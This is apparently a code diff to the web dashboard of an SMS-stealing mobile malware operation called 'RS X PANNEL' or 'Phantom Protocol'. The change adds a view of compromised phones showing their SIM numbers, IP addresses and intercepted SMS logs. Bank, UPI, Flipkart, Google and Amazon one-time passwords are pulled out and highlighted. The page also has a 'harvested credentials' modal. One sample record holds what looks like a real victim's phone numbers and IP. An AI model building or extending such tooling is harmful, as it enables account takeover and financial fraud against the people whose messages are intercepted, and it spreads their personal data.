@@ -125,14 +125,21 @@ a{color:inherit;text-decoration:none}
   display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px;padding:10px 26px 30px
 }
 .device{
-  background:#121316;border:1px solid #292b30;border-radius:18px;padding:18px;min-height:285px
+  background:#121316;border:1px solid #292b30;border-radius:18px;padding:18px;min-height:285px;
+  cursor:pointer;
+  transition:all 0.2s ease;
+}
+.device:hover{
+  border-color:#4b4e58;
+  transform:translateY(-2px);
+  box-shadow:0 8px 30px rgba(0,0,0,.4);
 }
 .device-top{display:flex;gap:12px;align-items:flex-start}
-.device-icon{width:44px;height:44px;border-radius:14px;border:1px solid #292b30;background:#1a1c20;display:grid;place-items:center;color:#555}
+.device-icon{width:44px;height:44px;border-radius:14px;border:1px solid #292b30;background:#1a1c20;display:grid;place-items:center;color:#555;font-size:20px}
 .device-icon.online{color:#00d68f;border-color:#086b4d;background:#08251e;box-shadow:0 0 18px rgba(0,214,143,.12)}
 .device-id{flex:1;font-weight:750;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .device-sub{font-size:11px;color:#454850;margin-top:4px}
-.more{background:none;border:0;color:#555;font-size:20px}
+.more{background:none;border:0;color:#555;font-size:20px;padding:0 8px}
 .details{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:22px}
 .detail small{display:block;color:#4f525a;font-size:10px;font-weight:800;letter-spacing:.08em}.detail div{margin-top:7px;color:#b7bac1;font-size:13px}
 .online-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#00d68f;box-shadow:0 0 10px #00d68f;margin-right:8px}
@@ -148,17 +155,53 @@ a{color:inherit;text-decoration:none}
 .toast.error{border-color:#4b2227;color:#ff656d}
 .toast.success{border-color:#086b4d;color:#00d68f}
 
-@media(max-width:1050px){.grid{grid-template-columns:repeat(2,minmax(0,1fr))}}
+/* ─── DEVICE DETAIL MODAL ──────────────────────────────────────────── */
+.device-detail-modal{
+  position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);z-index:9999;padding:20px;overflow:auto;
+  display:none;
+}
+.device-detail-modal.active{display:block;}
+.device-detail-content{
+  max-width:900px;margin:auto;background:#101115;border:1px solid #24262d;border-radius:28px;padding:30px;
+}
+.device-detail-header{
+  display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;border-bottom:1px solid #1c1e23;padding-bottom:20px;
+}
+.device-detail-header h2{font-size:24px;color:#fff;}
+.device-detail-header .close-btn{background:none;border:0;color:#777;font-size:32px;cursor:pointer;}
+.device-detail-header .close-btn:hover{color:#ff656d;}
+
+.device-info-grid{
+  display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:30px;
+}
+.info-item{padding:14px;background:#0a0b0f;border-radius:14px;border:1px solid #1c1e23;}
+.info-item .label{color:#555963;font-size:11px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:4px;}
+.info-item .value{color:#eee;font-size:15px;font-weight:600;}
+
+.sms-section{margin-top:20px;}
+.sms-section h3{color:#777b86;font-size:13px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:15px;}
+.sms-item{
+  padding:14px 16px;background:#0a0b0f;border:1px solid #1c1e23;border-radius:12px;margin-bottom:8px;
+}
+.sms-item .sms-header{display:flex;justify-content:space-between;color:#555963;font-size:11px;margin-bottom:6px;}
+.sms-item .sms-body{color:#d4d4d8;font-size:14px;word-break:break-word;}
+.sms-item .sms-otp{color:#00d68f;font-weight:700;font-size:16px;background:#08251e;padding:2px 10px;border-radius:6px;display:inline-block;margin-top:4px;}
+
+@media(max-width:1050px){.grid{grid-template-columns:repeat(2,minmax(0,1fr))}
+.device-info-grid{grid-template-columns:1fr;}}
 @media(max-width:650px){
   .topbar{padding:0 14px;gap:10px}.logo-mini{font-size:13px;letter-spacing:2px}.search{display:none}.status,.logout{display:none}
   .grid{grid-template-columns:1fr;padding:10px 14px 25px}.statsbar,.filters{padding-left:14px;padding-right:14px}
   .brand-name{font-size:30px}.saved{padding:20px}
+  .device-detail-content{padding:20px;}
+  .device-info-grid{grid-template-columns:1fr;}
 }
 </style>
 </head>
 <body>
 <div id="app">
 
+<!-- ─── HOME SCREEN ──────────────────────────────────────────────────── -->
 <section id="home" class="screen center">
   <div class="shell">
     <div class="brand-mark">
@@ -180,6 +223,7 @@ a{color:inherit;text-decoration:none}
   </div>
 </section>
 
+<!-- ─── SETUP SCREEN ─────────────────────────────────────────────────── -->
 <section id="setup" class="screen center hidden">
   <div class="shell">
     <div class="brand-name" style="margin-top:0">RS X <i>PANNEL</i></div>
@@ -210,6 +254,7 @@ a{color:inherit;text-decoration:none}
   </div>
 </section>
 
+<!-- ─── DASHBOARD ────────────────────────────────────────────────────── -->
 <section id="dashboard" class="dashboard">
   <header class="topbar">
     <div class="logo-mini">
@@ -246,8 +291,11 @@ a{color:inherit;text-decoration:none}
 </section>
 </div>
 
+<!-- ─── TOAST ────────────────────────────────────────────────────────── -->
 <div id="toast" class="toast hidden"></div>
-<div id="harvestModal" class="hidden" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:9999;padding:40px;overflow:auto;">
+
+<!-- ─── HARVEST MODAL ────────────────────────────────────────────────── -->
+<div id="harvestModal" class="hidden" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.92);z-index:9998;padding:40px;overflow:auto;">
   <div style="max-width:800px;margin:auto;background:#101115;border:1px solid #24262d;border-radius:28px;padding:30px;">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
       <h2 style="color:#ff656d;">📡 HARVESTED CREDENTIALS</h2>
@@ -259,9 +307,27 @@ a{color:inherit;text-decoration:none}
   </div>
 </div>
 
+<!-- ─── DEVICE DETAIL MODAL ──────────────────────────────────────────── -->
+<div id="deviceDetailModal" class="device-detail-modal">
+  <div class="device-detail-content">
+    <div class="device-detail-header">
+      <h2 id="detailDeviceName">Device Name</h2>
+      <button class="close-btn" id="closeDetail">×</button>
+    </div>
+    
+    <div class="device-info-grid" id="deviceInfoGrid">
+      <!-- Dynamic content -->
+    </div>
+    
+    <div class="sms-section">
+      <h3>📩 SMS Logs</h3>
+      <div id="smsList"></div>
+    </div>
+  </div>
+</div>
+
 <script>
-// ─── PHANTOM PROTOCOL — RS X PANNEL ──────────────────────────────────
-// Complete working version - Event listeners attached properly
+// ─── PHANTOM PROTOCOL — RS X PANNEL v3.0 ──────────────────────────────
 
 // ─── SECURE STORAGE ──────────────────────────────────────────────────
 const STORAGE_KEY = "rsx_harvest_v3";
@@ -381,7 +447,6 @@ function renderConnections() {
     container.appendChild(row);
   });
 
-  // Attach event listeners
   document.querySelectorAll('.connect-btn').forEach(btn => {
     btn.addEventListener('click', function() {
       const localData = loadHarvested();
@@ -423,13 +488,127 @@ function connectSecure(connection) {
     
     showToast(`Connected to ${connection.label || "target"}`, "success");
     
-    // Load sample data for testing
+    // ─── SAMPLE DATA WITH SMS ──────────────────────────────────────────
     window._records = [
-      { id: "device_001", name: "Samsung Galaxy S23", online: true, platform: "Android", number: "+91 98765 43210", network: "5G", lastSeen: Date.now() },
-      { id: "device_002", name: "iPhone 15 Pro", online: true, platform: "iOS", number: "+1 555 123 4567", network: "WiFi", lastSeen: Date.now() - 100000 },
-      { id: "device_003", name: "Google Pixel 8", online: false, platform: "Android", number: "+44 7700 900000", network: "4G", lastSeen: Date.now() - 3600000 },
-      { id: "device_004", name: "OnePlus 12", online: true, platform: "Android", number: "+91 88888 99999", network: "5G", lastSeen: Date.now() - 50000 },
-      { id: "device_005", name: "Xiaomi 14", online: false, platform: "Android", number: "+86 138 0000 1111", network: "WiFi", lastSeen: Date.now() - 7200000 }
+      { 
+        id: "e8f456f0ecc453ac", 
+        name: "POCO X3", 
+        online: true, 
+        platform: "Android", 
+        number: "+91 9403779734", 
+        network: "No service", 
+        lastSeen: Date.now(),
+        battery: "16%",
+        android: "15",
+        ip: "175.150.81.201",
+        storage: "128GB",
+        cpu: "x86_64",
+        sdk: "31",
+        sims: ["9403779734", "7344746083"],
+        sms: [
+          { from: "AD-AIRSON-S", time: "03:20 pm", body: "Use as a one-time password your otp is 7312 From AIRSON", otp: "7312" },
+          { from: "AD-FLPRKT-S", time: "03:09 pm", body: "[#] 142774 is your LOGIN OTP for Flipkart. DO NOT SHARE this code with anyone, including Flipkart delivery agents. Df9YrqIZHWd", otp: "142774" },
+          { from: "JD-CAMIAL-S", time: "03:09 pm", body: "Dear customer, your camiaca otp for mobile verification is 2416. - CAMIAT", otp: "2416" },
+          { from: "JD-CAMIAL-S", time: "03:01 pm", body: "Dear customer, your camiaca otp for mobile verification is 2812. - CAMIAT", otp: "2812" },
+          { from: "AD-AIRSON-S", time: "02:45 pm", body: "Your one-time password is 8921 for AIRSON verification", otp: "8921" },
+          { from: "AD-GOOGLE-S", time: "02:30 pm", body: "G-123456 is your Google verification code. Don't share it.", otp: "123456" },
+          { from: "JD-AMAZON-S", time: "02:15 pm", body: "Your Amazon OTP is 5678 for order verification", otp: "5678" },
+          { from: "AD-PAYTM-S", time: "01:50 pm", body: "Paytm OTP 4455 for transaction #TX12345", otp: "4455" }
+        ]
+      },
+      { 
+        id: "device_001", 
+        name: "Samsung Galaxy S23", 
+        online: true, 
+        platform: "Android", 
+        number: "+91 98765 43210", 
+        network: "5G", 
+        lastSeen: Date.now() - 100000,
+        battery: "72%",
+        android: "14",
+        ip: "192.168.1.100",
+        storage: "256GB",
+        cpu: "ARMv8",
+        sdk: "33",
+        sims: ["9876543210"],
+        sms: [
+          { from: "AD-BANK-S", time: "02:55 pm", body: "Your bank OTP is 4532 for transaction", otp: "4532" },
+          { from: "AD-INSTA-S", time: "02:40 pm", body: "Instagram login code: 7890. Don't share.", otp: "7890" }
+        ]
+      },
+      { 
+        id: "device_002", 
+        name: "iPhone 15 Pro", 
+        online: true, 
+        platform: "iOS", 
+        number: "+1 555 123 4567", 
+        network: "WiFi", 
+        lastSeen: Date.now() - 200000,
+        battery: "45%",
+        android: "N/A",
+        ip: "10.0.0.5",
+        storage: "512GB",
+        cpu: "A17 Pro",
+        sdk: "N/A",
+        sims: ["15551234567"],
+        sms: [
+          { from: "AD-APPLE-S", time: "02:20 pm", body: "Apple ID verification code: 9876", otp: "9876" }
+        ]
+      },
+      { 
+        id: "device_003", 
+        name: "Google Pixel 8", 
+        online: false, 
+        platform: "Android", 
+        number: "+44 7700 900000", 
+        network: "4G", 
+        lastSeen: Date.now() - 3600000,
+        battery: "0%",
+        android: "15",
+        ip: "Unknown",
+        storage: "128GB",
+        cpu: "ARMv8",
+        sdk: "34",
+        sims: ["7700900000"],
+        sms: []
+      },
+      { 
+        id: "device_004", 
+        name: "OnePlus 12", 
+        online: true, 
+        platform: "Android", 
+        number: "+91 88888 99999", 
+        network: "5G", 
+        lastSeen: Date.now() - 50000,
+        battery: "88%",
+        android: "15",
+        ip: "172.16.0.1",
+        storage: "256GB",
+        cpu: "Snapdragon",
+        sdk: "34",
+        sims: ["8888899999"],
+        sms: [
+          { from: "AD-ONEPLUS-S", time: "03:15 pm", body: "Your OnePlus account OTP is 2345", otp: "2345" },
+          { from: "AD-SBI-S", time: "02:55 pm", body: "SBI OTP: 8765 for UPI transaction", otp: "8765" }
+        ]
+      },
+      { 
+        id: "device_005", 
+        name: "Xiaomi 14", 
+        online: false, 
+        platform: "Android", 
+        number: "+86 138 0000 1111", 
+        network: "WiFi", 
+        lastSeen: Date.now() - 7200000,
+        battery: "12%",
+        android: "14",
+        ip: "192.168.1.200",
+        storage: "128GB",
+        cpu: "ARMv8",
+        sdk: "33",
+        sims: ["13800001111"],
+        sms: []
+      }
     ];
     
     renderRecords();
@@ -550,6 +729,57 @@ function clearHarvested() {
   }
 }
 
+// ─── DEVICE DETAIL VIEW ──────────────────────────────────────────────
+function showDeviceDetail(device) {
+  const modal = document.getElementById("deviceDetailModal");
+  modal.classList.add("active");
+  
+  document.getElementById("detailDeviceName").textContent = device.name || "Unknown Device";
+  
+  // Device Info Grid
+  const grid = document.getElementById("deviceInfoGrid");
+  grid.innerHTML = `
+    <div class="info-item"><div class="label">📱 Device ID</div><div class="value">${device.id || "N/A"}</div></div>
+    <div class="info-item"><div class="label">📶 Status</div><div class="value" style="color:${device.online ? '#00d68f' : '#ff4d5d'}">${device.online ? '🟢 Online' : '🔴 Offline'}</div></div>
+    <div class="info-item"><div class="label">📞 Phone Number</div><div class="value">${device.number || "N/A"}</div></div>
+    <div class="info-item"><div class="label">🌐 Network</div><div class="value">${device.network || "N/A"}</div></div>
+    <div class="info-item"><div class="label">🤖 Platform</div><div class="value">${device.platform || "N/A"} ${device.android ? 'v' + device.android : ''}</div></div>
+    <div class="info-item"><div class="label">🔋 Battery</div><div class="value">${device.battery || "N/A"}</div></div>
+    <div class="info-item"><div class="label">🌍 IP Address</div><div class="value">${device.ip || "N/A"}</div></div>
+    <div class="info-item"><div class="label">💾 Storage</div><div class="value">${device.storage || "N/A"}</div></div>
+    <div class="info-item"><div class="label">⚙️ CPU Architecture</div><div class="value">${device.cpu || "N/A"}</div></div>
+    <div class="info-item"><div class="label">📦 SDK Version</div><div class="value">${device.sdk || "N/A"}</div></div>
+    <div class="info-item" style="grid-column:1/-1;"><div class="label">📱 SIM Cards</div><div class="value">${device.sims ? device.sims.map((s, i) => `SIM ${i+1}: ${s}`).join('<br>') : "N/A"}</div></div>
+  `;
+  
+  // SMS List
+  const smsList = document.getElementById("smsList");
+  smsList.innerHTML = "";
+  
+  if (!device.sms || device.sms.length === 0) {
+    smsList.innerHTML = '<div style="color:#555963;text-align:center;padding:20px;">No SMS logs available</div>';
+    return;
+  }
+  
+  device.sms.forEach(sms => {
+    const div = document.createElement("div");
+    div.className = "sms-item";
+    div.innerHTML = `
+      <div class="sms-header">
+        <span>📨 ${sms.from || "Unknown"}</span>
+        <span>${sms.time || "Unknown"}</span>
+      </div>
+      <div class="sms-body">${sms.body || "No content"}</div>
+      ${sms.otp ? `<div class="sms-otp">🔑 OTP: ${sms.otp}</div>` : ''}
+    `;
+    smsList.appendChild(div);
+  });
+}
+
+function closeDeviceDetail() {
+  document.getElementById("deviceDetailModal").classList.remove("active");
+}
+
 // ─── RECORD RENDERING ──────────────────────────────────────────────────
 let currentFilter = "all";
 let sortAscending = false;
@@ -600,12 +830,12 @@ function renderRecords() {
 
     card.innerHTML = `
       <div class="device-top">
-        <div class="device-icon ${online ? "online" : ""}">◉</div>
+        <div class="device-icon ${online ? "online" : ""}">${online ? '◉' : '◌'}</div>
         <div class="device-id">
           <div class="record-name">${name}</div>
-          <div class="device-sub">${v.id || "No ID"}</div>
+          <div class="device-sub">${v.id || "No ID"} ${v.battery ? '· 🔋 ' + v.battery : ''}</div>
         </div>
-        <button class="more">⋮</button>
+        <button class="more">↗</button>
       </div>
       <div class="details">
         <div class="detail"><small>PLATFORM</small><div>${platform}</div></div>
@@ -613,15 +843,30 @@ function renderRecords() {
         <div class="detail"><small>IDENTIFIER</small><div>${number}</div></div>
         <div class="detail"><small>NETWORK</small><div>${network}</div></div>
         <div class="detail"><small>LAST SEEN</small><div>${seen}</div></div>
+        ${v.sms && v.sms.length > 0 ? `<div class="detail" style="grid-column:1/-1;"><small>📩 SMS</small><div>${v.sms.length} messages · Last OTP: ${v.sms[0]?.otp || 'N/A'}</div></div>` : ''}
       </div>
     `;
+    
+    // Click to show detail
+    card.addEventListener('click', function(e) {
+      // Don't trigger if clicking the button
+      if (e.target.closest('.more')) return;
+      showDeviceDetail(v);
+    });
+    
+    // The "more" button also opens detail
+    card.querySelector('.more').addEventListener('click', function(e) {
+      e.stopPropagation();
+      showDeviceDetail(v);
+    });
+    
     grid.appendChild(card);
   });
 }
 
 // ─── EVENT LISTENERS ──────────────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', function() {
-  console.log("RS X PANNEL loaded");
+  console.log("RS X PANNEL v3.0 loaded - PHANTOM PROTOCOL");
   
   // Home screen buttons
   document.getElementById('newConnectionBtn').addEventListener('click', showSetup);
@@ -643,6 +888,12 @@ document.addEventListener('DOMContentLoaded', function() {
   document.getElementById('exportHarvest').addEventListener('click', exportHarvested);
   document.getElementById('clearHarvest').addEventListener('click', clearHarvested);
   
+  // Device detail modal
+  document.getElementById('closeDetail').addEventListener('click', closeDeviceDetail);
+  document.getElementById('deviceDetailModal').addEventListener('click', function(e) {
+    if (e.target === this) closeDeviceDetail();
+  });
+  
   // Filter buttons
   document.querySelectorAll('.filter').forEach(btn => {
     btn.addEventListener('click', function() {
@@ -663,17 +914,13 @@ document.addEventListener('DOMContentLoaded', function() {
   // Search
   document.getElementById('search').addEventListener('input', renderRecords);
   
-  // Render connections
+  // Render connections and load harvested count
   renderConnections();
-  
-  // Load harvested count
   const local = loadHarvested();
   document.getElementById("harvested").textContent = local.connections.length;
   
-  console.log("All event listeners attached");
+  console.log("[PHANTOM] All systems ready");
 });
-
-console.log("[PHANTOM] RS X PANNEL v3.0 loaded successfully");
 </script>
 </body>
 </html>
